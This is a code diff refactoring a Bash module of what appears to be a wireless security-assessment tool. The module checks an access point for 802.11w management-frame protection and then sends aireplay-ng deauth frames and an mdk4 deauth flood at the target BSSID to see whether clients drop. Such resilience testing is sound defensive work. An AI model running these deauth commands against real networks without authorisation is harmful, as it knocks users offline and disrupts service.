@@ -12,34 +12,34 @@
 
 set -uo pipefail
 
-#===============================================================================
-#  modules/e3_deauth_resilience.sh
-#  E3: Deauthentication Resilience (802.11w / MFP)
-#
-#  PURPOSE:
-#    Test if the target network is resilient to deauthentication attacks.
-#    Check for 802.11w (Management Frame Protection / MFP) support and
-#    verify if deauth frames actually disconnect clients.
-#
-#  TOOLS: ${TOOL_PATHS[mdk4]}, ${TOOL_PATHS[aireplay-ng]}, ${TOOL_PATHS[tcpdump]}, ${TOOL_PATHS[tshark]}
-#  PHASE: 2A — Attack Simulations
-#  DEPENDENCIES: A1 (needs target SSID/BSSID/channel)
-#
-#  EVIDENCE PRODUCED:
-#    - e3_beacon_analysis.txt      (802.11w capability analysis)
-#    - e3_deauth_capture.pcap      (deauth frame capture)
-#    - e3_findings.txt             (analysis summary)
-#
-#  RESULT JSON FIELDS:
-#    - mfp_advertised: bool — AP advertises 802.11w support
-#    - mfp_required: bool — AP requires 802.11w (not optional)
-#    - deauth_effective: bool — deauth actually disconnected clients
-#    - deauth_method: string — tool used for testing
-#===============================================================================
-
 run_e3() {
+    local interface=""
+    local bssid="${GUEST_BSSID:-}"
+    local ssid="${GUEST_SSID:-}"
+    local channel="${GUEST_CHANNEL:-}"
+    local evidence_dir="${SESSION_EVIDENCE_DIR:-}"
+
+    # Parse arguments
+    while [[ $# -gt 0 ]]; do
+        case "$1" in
+            --interface) interface="$2"; shift 2 ;;
+            --bssid) bssid="$2"; shift 2 ;;
+            --ssid) ssid="$2"; shift 2 ;;
+            --channel) channel="$2"; shift 2 ;;
+            --evidence-dir) evidence_dir="$2"; shift 2 ;;
+            *) shift ;;
+        esac
+    done
+
+    # Fallbacks to globals
+    interface="${interface:-${WIFI_INTERFACE:-}}"
+    bssid="${bssid:-${GUEST_BSSID:-}}"
+    ssid="${ssid:-${GUEST_SSID:-}}"
+    channel="${channel:-${GUEST_CHANNEL:-}}"
+    evidence_dir="${evidence_dir:-${SESSION_EVIDENCE_DIR:-}}"
+
     local total_steps=6
-    local evidence_prefix="${SESSION_EVIDENCE_DIR}/e3"
+    local evidence_prefix="${evidence_dir}/e3"
 
     #--- Step 1: Verify tools ---
     log_step 1 $total_steps "Verifying tools"
@@ -60,15 +60,18 @@ run_e3() {
         return 1
     fi
 
-    if [[ -z "${GUEST_SSID:-}" || -z "${GUEST_BSSID:-}" ]]; then
+    if [[ -z "$ssid" || -z "$bssid" ]]; then
         log_warn "Target SSID/BSSID not set."
         if ! select_target_network; then
             log_error "No target selected. Run A1 first or enter manually."
             return 1
         fi
+        ssid="${GUEST_SSID:-}"
+        bssid="${GUEST_BSSID:-}"
+        channel="${GUEST_CHANNEL:-}"
     fi
 
-    log_success "Target: ${GUEST_SSID} (${GUEST_BSSID}) CH ${GUEST_CHANNEL:-auto}"
+    log_success "Target: ${ssid} (${bssid}) CH ${channel:-auto}"
 
     #--- Warning banner ---
     echo ""
@@ -99,7 +102,7 @@ run_e3() {
         echo "============================================================"
         echo "  E3: Deauthentication Resilience Test"
         echo "  Date: $(date '+%Y-%m-%d %H:%M:%S')"
-        echo "  Target: ${GUEST_SSID} (${GUEST_BSSID})"
+        echo "  Target: ${ssid} (${bssid})"
         echo "============================================================"
         echo ""
     } > "$findings_file"
@@ -108,12 +111,13 @@ run_e3() {
     log_step 2 $total_steps "Analyzing AP beacon for 802.11w/MFP capabilities"
     update_tc_progress 2 $total_steps "Beacon analysis"
 
+    WIFI_INTERFACE="$interface"
     enable_monitor_mode || return 1
     local mon_iface="${MONITOR_INTERFACE}"
 
     # Set channel
-    if [[ -n "${GUEST_CHANNEL:-}" ]]; then
-        iw dev "$mon_iface" set channel "$GUEST_CHANNEL" 2>/dev/null || true
+    if [[ -n "$channel" ]]; then
+        run_fg iw dev "$mon_iface" set channel "$channel" 2>/dev/null || true
     fi
 
     check_abort || return 1
@@ -121,7 +125,7 @@ run_e3() {
     {
         echo "============================================================"
         echo "  802.11w / MFP Beacon Analysis"
-        echo "  Target: ${GUEST_BSSID}"
+        echo "  Target: ${bssid}"
         echo "============================================================"
         echo ""
     } > "$beacon_file"
@@ -129,15 +133,15 @@ run_e3() {
     if [[ "$has_tshark" == "true" ]]; then
         # Capture a few beacons and check RSN capabilities
         local beacon_pcap="$TMP_DIR/e3_beacon.pcap"
-        timeout 10 run_fg "tcpdump" -i "$mon_iface" -c 20 -w "$beacon_pcap" \
-            "type mgt subtype beacon and ether src ${GUEST_BSSID}" &>/dev/null || true
+        timeout 10 run_fg tcpdump -i "$mon_iface" -c 20 -w "$beacon_pcap" \
+            "type mgt subtype beacon and ether src ${bssid}" &>/dev/null || true
 
         if [[ -f "$beacon_pcap" && -s "$beacon_pcap" ]]; then
             ensure_user_ownership "$beacon_pcap"
             # Check for RSN capabilities — MFP bits
             local rsn_caps
-            local rsn_caps=$(run_as_user tshark -r "$beacon_pcap" \
-                -Y "wlan.bssid == ${GUEST_BSSID}" \
+            rsn_caps=$(run_as_user tshark -r "$beacon_pcap" \
+                -Y "wlan.bssid == ${bssid}" \
                 -T fields \
                 -e wlan.rsn.capabilities \
                 -e wlan.rsn.capabilities.mfpc \
@@ -146,8 +150,8 @@ run_e3() {
 
             if [[ -n "$rsn_caps" ]]; then
                 local mfpc mfpr
-                local mfpc=$(echo "$rsn_caps" | awk -F'\t' '{print $2}')
-                local mfpr=$(echo "$rsn_caps" | awk -F'\t' '{print $3}')
+                mfpc=$(echo "$rsn_caps" | awk -F'\t' '{print $2}')
+                mfpr=$(echo "$rsn_caps" | awk -F'\t' '{print $3}')
 
                 echo "RSN Capabilities: ${rsn_caps}" >> "$beacon_file"
 
@@ -174,8 +178,8 @@ run_e3() {
 
             # Also check encryption type
             local encryption
-            local encryption=$(run_as_user tshark -r "$beacon_pcap" \
-                -Y "wlan.bssid == ${GUEST_BSSID}" \
+            encryption=$(run_as_user tshark -r "$beacon_pcap" \
+                -Y "wlan.bssid == ${bssid}" \
                 -T fields \
                 -e wlan.rsn.akms.type \
                 2>/dev/null | head -1 || true)
@@ -235,13 +239,13 @@ run_e3() {
         if [[ "$has_aireplay" == "true" ]]; then
             deauth_method="aireplay-ng"
             # Send targeted deauth
-            run_fg "aireplay-ng" --deauth 20 -a "$GUEST_BSSID" "$mon_iface" &>/dev/null || true
+            run_fg aireplay-ng --deauth 20 -a "$bssid" "$mon_iface" &>/dev/null || true
             echo "Sent 20 targeted deauth frames via aireplay-ng" >> "$findings_file"
 
             sleep 5
 
             # Send broadcast deauth
-            run_fg "aireplay-ng" --deauth 10 -a "$GUEST_BSSID" "$mon_iface" &>/dev/null || true
+            run_fg aireplay-ng --deauth 10 -a "$bssid" "$mon_iface" &>/dev/null || true
             echo "Sent 10 broadcast deauth frames via aireplay-ng" >> "$findings_file"
         fi
 
@@ -249,9 +253,9 @@ run_e3() {
             deauth_method="${deauth_method:+${deauth_method}+}mdk4"
 
             # mdk4 deauth mode — brief burst
-            timeout 15 run_fg "mdk4" "$mon_iface" d \
-                -B "$GUEST_BSSID" \
-                -c "${GUEST_CHANNEL:-0}" &>/dev/null || true
+            timeout 15 run_fg mdk4 "$mon_iface" d \
+                -B "$bssid" \
+                -c "${channel:-0}" &>/dev/null || true
 
             echo "Ran mdk4 deauth flood for 15 seconds" >> "$findings_file"
         fi
@@ -284,7 +288,7 @@ run_e3() {
         # Count deauth frames seen (from AP — could be countermeasure)
         local deauth_from_ap
         deauth_from_ap=$(run_as_user tshark -r "$deauth_pcap" \
-            -Y "wlan.fc.type_subtype == 0x0c and wlan.sa == ${GUEST_BSSID}" \
+            -Y "wlan.fc.type_subtype == 0x0c and wlan.sa == ${bssid}" \
             2>/dev/null | wc -l) || true
         deauth_from_ap=${deauth_from_ap:-0}
 
@@ -347,7 +351,7 @@ run_e3() {
     evidence_register_file "$findings_file"
 
     local result_json
-    result_json=$(run_fg "jq" -n \
+    result_json=$(run_fg jq -n \
         --arg status "$result_status" \
         --arg summary "$result_summary" \
         --arg details "MFP advertised: ${mfp_advertised}, MFP required: ${mfp_required}, Deauth effective: ${deauth_effective}, Method: ${deauth_method}" \
